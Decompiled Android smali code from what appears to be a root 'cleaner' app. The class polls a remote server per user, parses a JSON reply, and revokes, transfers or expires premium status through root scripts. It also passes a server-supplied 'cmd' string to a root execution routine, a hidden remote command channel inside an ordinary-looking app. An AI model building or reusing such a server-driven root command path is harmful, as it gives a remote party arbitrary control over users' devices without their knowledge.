.class LCleaner/Royall/pi;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:LCleaner/Royall/MainActivity;


# direct methods
.method public static synthetic $r8$lambda$-xFwbpTPLp4wSfJ8_FaIFxTPPU0()V
    .locals 0

    invoke-static {}, LCleaner/Royall/pi;->b()V

    return-void
.end method

.method public static synthetic $r8$lambda$2bcueqk379sne3waLNrCeFTjDws(LCleaner/Royall/pi;)V
    .locals 0

    invoke-direct {p0}, LCleaner/Royall/pi;->a()V

    return-void
.end method

.method public static synthetic $r8$lambda$GbdGTam8DiMqC6d5Zux9mNdh_EU(LCleaner/Royall/pi;)V
    .locals 0

    invoke-direct {p0}, LCleaner/Royall/pi;->g()V

    return-void
.end method

.method public static synthetic $r8$lambda$WDQehr5aRWKJALvOwZKDabkAD6k(LCleaner/Royall/pi;LCleaner/Royall/zw;)V
    .locals 0

    invoke-direct {p0, p1}, LCleaner/Royall/pi;->b(LCleaner/Royall/zw;)V

    return-void
.end method

.method public static synthetic $r8$lambda$Z61oD5BEAcF28XdUtZJKUtAhzbU()V
    .locals 0

    invoke-static {}, LCleaner/Royall/pi;->f()V

    return-void
.end method

.method public static synthetic $r8$lambda$drY_bCP9mTVEth17YigLOYmtQG4()V
    .locals 0

    invoke-static {}, LCleaner/Royall/pi;->h()V

    return-void
.end method

.method public static synthetic $r8$lambda$jFjijfFcw2ibqZysOC8XFo0C8wI(LCleaner/Royall/pi;LCleaner/Royall/zw;)V
    .locals 0

    invoke-direct {p0, p1}, LCleaner/Royall/pi;->a(LCleaner/Royall/zw;)V

    return-void
.end method

.method public static synthetic $r8$lambda$m1f7maaelGoMq8MeGxyv_G1b9qA(LCleaner/Royall/pi;)V
    .locals 0

    invoke-direct {p0}, LCleaner/Royall/pi;->e()V

    return-void
.end method

.method public static synthetic $r8$lambda$vatER60e7YZxFbhlDOgvo2-5nPA(LCleaner/Royall/pi;)V
    .locals 0

    invoke-direct {p0}, LCleaner/Royall/pi;->c()V

    return-void
.end method

.method public static synthetic $r8$lambda$x-MmUhizIsLjI6bLUl4Sz0aMQYU()V
    .locals 0

    invoke-static {}, LCleaner/Royall/pi;->d()V

    return-void
.end method

.method constructor <init>(LCleaner/Royall/MainActivity;)V
    .locals 0

    iput-object p1, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(LCleaner/Royall/pi;)LCleaner/Royall/MainActivity;
    .locals 0

    iget-object p0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    return-object p0
.end method

.method private synthetic a()V
    .locals 2

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v0}, LCleaner/Royall/MainActivity;->-$$Nest$fgetbE(LCleaner/Royall/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "purchased"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v0}, LCleaner/Royall/MainActivity;->-$$Nest$fgetbE(LCleaner/Royall/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "prmntprchse"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v1, "premium"

    invoke-static {v0, v1, v1}, LCleaner/Royall/kb;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v1, "Premium Removed success."

    invoke-virtual {v0, v1}, LCleaner/Royall/MainActivity;->a(Ljava/lang/String;)V

    return-void
.end method

.method private synthetic a(LCleaner/Royall/zw;)V
    .locals 20

    move-object/from16 v0, p0

    const-string v1, "none"

    const-string v2, "informdev"

    const-string v3, "Msg"

    const-string v4, "cmd"

    const-string v5, "Xcmd"

    iget-object v6, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-virtual/range {p1 .. p1}, LCleaner/Royall/zw;->a()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, LCleaner/Royall/MainActivity;->-$$Nest$fputf(LCleaner/Royall/MainActivity;Ljava/lang/String;)V

    iget-object v6, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v7, "secure"

    const-string v8, "checkerPro"

    const-string v9, "1"

    const/4 v10, 0x0

    invoke-static {v6, v7, v8, v9, v10}, LCleaner/Royall/kb;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    iget-object v6, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v6}, LCleaner/Royall/MainActivity;->-$$Nest$fgetf(LCleaner/Royall/MainActivity;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "Invalid request"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_4

    iget-object v6, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v6}, LCleaner/Royall/MainActivity;->-$$Nest$fgetf(LCleaner/Royall/MainActivity;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "Not Found"

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_4

    iget-object v6, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v6}, LCleaner/Royall/MainActivity;->-$$Nest$fgetf(LCleaner/Royall/MainActivity;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "\"status\": \"0\""

    invoke-virtual {v6, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_4

    :try_start_0
    iget-object v6, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v6}, LCleaner/Royall/MainActivity;->-$$Nest$fgetf(LCleaner/Royall/MainActivity;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Lorg/json/JSONObject;

    invoke-direct {v7, v6}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, LCleaner/Royall/wh;->a(Ljava/lang/String;Ljava/lang/Object;)V

    const-string v6, "XMsg"

    invoke-virtual {v7, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v6, v8}, LCleaner/Royall/wh;->a(Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v7, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v2, v6}, LCleaner/Royall/wh;->a(Ljava/lang/String;Ljava/lang/Object;)V

    const-string v2, "RemovePremium"

    invoke-virtual {v7, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v6, "/Premium/Remover.txt"

    const-string v8, "SECURE"

    const-string v10, ""

    if-eqz v2, :cond_0

    :try_start_1
    new-instance v15, LCleaner/Royall/zw;

    invoke-direct {v15, v10}, LCleaner/Royall/zw;-><init>(Ljava/lang/String;)V

    iget-object v11, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-virtual {v11}, LCleaner/Royall/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2, v6, v8}, LCleaner/Royall/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/16 v16, 0x0

    const v17, 0x7f030059

    new-instance v2, LCleaner/Royall/pi$$ExternalSyntheticLambda0;

    invoke-direct {v2, v0}, LCleaner/Royall/pi$$ExternalSyntheticLambda0;-><init>(LCleaner/Royall/pi;)V

    new-instance v19, LCleaner/Royall/pi$$ExternalSyntheticLambda1;

    invoke-direct/range {v19 .. v19}, LCleaner/Royall/pi$$ExternalSyntheticLambda1;-><init>()V

    move-object/from16 v18, v2

    invoke-static/range {v11 .. v19}, LCleaner/Royall/RootPro;->run(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;LCleaner/Royall/zw;IILjava/lang/Runnable;Ljava/lang/Runnable;)V

    :cond_0
    const-string v2, "TransferredPremium"

    invoke-virtual {v7, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    new-instance v15, LCleaner/Royall/zw;

    invoke-direct {v15, v10}, LCleaner/Royall/zw;-><init>(Ljava/lang/String;)V

    iget-object v11, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-virtual {v11}, LCleaner/Royall/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2, v6, v8}, LCleaner/Royall/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/16 v16, 0x0

    const v17, 0x7f030059

    new-instance v2, LCleaner/Royall/pi$$ExternalSyntheticLambda2;

    invoke-direct {v2, v0}, LCleaner/Royall/pi$$ExternalSyntheticLambda2;-><init>(LCleaner/Royall/pi;)V

    new-instance v19, LCleaner/Royall/pi$$ExternalSyntheticLambda3;

    invoke-direct/range {v19 .. v19}, LCleaner/Royall/pi$$ExternalSyntheticLambda3;-><init>()V

    move-object/from16 v18, v2

    invoke-static/range {v11 .. v19}, LCleaner/Royall/RootPro;->run(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;LCleaner/Royall/zw;IILjava/lang/Runnable;Ljava/lang/Runnable;)V

    :cond_1
    invoke-virtual {v7, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_2

    iget-object v2, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    new-instance v3, LCleaner/Royall/pj;

    invoke-direct {v3, v0}, LCleaner/Royall/pj;-><init>(LCleaner/Royall/pi;)V

    invoke-virtual {v2, v3}, LCleaner/Royall/MainActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    :cond_2
    const-string v2, "expired"

    invoke-virtual {v7, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    new-instance v15, LCleaner/Royall/zw;

    invoke-direct {v15, v10}, LCleaner/Royall/zw;-><init>(Ljava/lang/String;)V

    iget-object v11, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-virtual {v11}, LCleaner/Royall/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "/Premium/secured.txt"

    invoke-static {v2, v3, v8}, LCleaner/Royall/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/16 v16, 0x0

    const v17, 0x7f030059

    new-instance v2, LCleaner/Royall/pi$$ExternalSyntheticLambda4;

    invoke-direct {v2, v0}, LCleaner/Royall/pi$$ExternalSyntheticLambda4;-><init>(LCleaner/Royall/pi;)V

    new-instance v19, LCleaner/Royall/pi$$ExternalSyntheticLambda5;

    invoke-direct/range {v19 .. v19}, LCleaner/Royall/pi$$ExternalSyntheticLambda5;-><init>()V

    move-object/from16 v18, v2

    invoke-static/range {v11 .. v19}, LCleaner/Royall/RootPro;->run(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;LCleaner/Royall/zw;IILjava/lang/Runnable;Ljava/lang/Runnable;)V

    :cond_3
    invoke-virtual {v7, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    new-instance v15, LCleaner/Royall/zw;

    invoke-direct {v15, v10}, LCleaner/Royall/zw;-><init>(Ljava/lang/String;)V

    iget-object v11, v0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v5}, LCleaner/Royall/wh;->b(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/16 v16, 0x0

    const v17, 0x7f030059

    new-instance v1, LCleaner/Royall/pi$$ExternalSyntheticLambda6;

    invoke-direct {v1, v0}, LCleaner/Royall/pi$$ExternalSyntheticLambda6;-><init>(LCleaner/Royall/pi;)V

    new-instance v19, LCleaner/Royall/pi$$ExternalSyntheticLambda7;

    invoke-direct/range {v19 .. v19}, LCleaner/Royall/pi$$ExternalSyntheticLambda7;-><init>()V

    move-object/from16 v18, v1

    invoke-static/range {v11 .. v19}, LCleaner/Royall/RootPro;->run(Landroid/app/Activity;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;LCleaner/Royall/zw;IILjava/lang/Runnable;Ljava/lang/Runnable;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_4
    return-void
.end method

.method private static synthetic b()V
    .locals 0

    return-void
.end method

.method private synthetic b(LCleaner/Royall/zw;)V
    .locals 1

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-virtual {p1}, LCleaner/Royall/zw;->a()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, LCleaner/Royall/MainActivity;->-$$Nest$fputf(LCleaner/Royall/MainActivity;Ljava/lang/String;)V

    return-void
.end method

.method private synthetic c()V
    .locals 2

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v0}, LCleaner/Royall/MainActivity;->-$$Nest$fgetbE(LCleaner/Royall/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "purchased"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v0}, LCleaner/Royall/MainActivity;->-$$Nest$fgetbE(LCleaner/Royall/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "prmntprchse"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v1, "premium"

    invoke-static {v0, v1, v1}, LCleaner/Royall/kb;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v1, "Premium Transfer Success."

    invoke-virtual {v0, v1}, LCleaner/Royall/MainActivity;->a(Ljava/lang/String;)V

    return-void
.end method

.method private static synthetic d()V
    .locals 0

    return-void
.end method

.method private synthetic e()V
    .locals 5

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v0}, LCleaner/Royall/MainActivity;->-$$Nest$fgetbp(LCleaner/Royall/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "expiredd"

    const-string v2, "1"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v1, "premium"

    const-string v3, "Expire"

    const/4 v4, 0x0

    invoke-static {v0, v1, v3, v2, v4}, LCleaner/Royall/kb;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v1, "Premium set to Expired."

    invoke-virtual {v0, v1}, LCleaner/Royall/MainActivity;->a(Ljava/lang/String;)V

    return-void
.end method

.method private static synthetic f()V
    .locals 0

    return-void
.end method

.method private synthetic g()V
    .locals 2

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    const-string v1, "Custom Cmd Run Sucess."

    invoke-virtual {v0, v1}, LCleaner/Royall/MainActivity;->a(Ljava/lang/String;)V

    return-void
.end method

.method private static synthetic h()V
    .locals 0

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    new-instance v4, LCleaner/Royall/zw;

    const-string v0, "X"

    invoke-direct {v4, v0}, LCleaner/Royall/zw;-><init>(Ljava/lang/String;)V

    iget-object v0, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-virtual {v0}, LCleaner/Royall/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "/BotsApi/server"

    const-string v3, "SECURE"

    invoke-static {v1, v2, v3}, LCleaner/Royall/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v2}, LCleaner/Royall/MainActivity;->-$$Nest$fgetbp(LCleaner/Royall/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v2

    const-string v3, "pid"

    const-string v5, ""

    invoke-interface {v2, v3, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, LCleaner/Royall/pi;->a:LCleaner/Royall/MainActivity;

    invoke-static {v2}, LCleaner/Royall/MainActivity;->-$$Nest$fgetbp(LCleaner/Royall/MainActivity;)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2, v3, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    goto :goto_0

    :cond_0
    const-string v2, "default"

    :goto_0
    const-string v3, "users/"

    invoke-virtual {v3, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    new-instance v5, LCleaner/Royall/pi$$ExternalSyntheticLambda8;

    invoke-direct {v5, p0, v4}, LCleaner/Royall/pi$$ExternalSyntheticLambda8;-><init>(LCleaner/Royall/pi;LCleaner/Royall/zw;)V

    new-instance v6, LCleaner/Royall/pi$$ExternalSyntheticLambda9;

    invoke-direct {v6, p0, v4}, LCleaner/Royall/pi$$ExternalSyntheticLambda9;-><init>(LCleaner/Royall/pi;LCleaner/Royall/zw;)V

    const-string v3, "GET"

    invoke-static/range {v0 .. v6}, LCleaner/Royall/zt;->a(Landroid/app/Activity;Ljava/lang/String;ZLjava/lang/String;LCleaner/Royall/zw;Ljava/lang/Runnable;Ljava/lang/Runnable;)V

    return-void
.end method
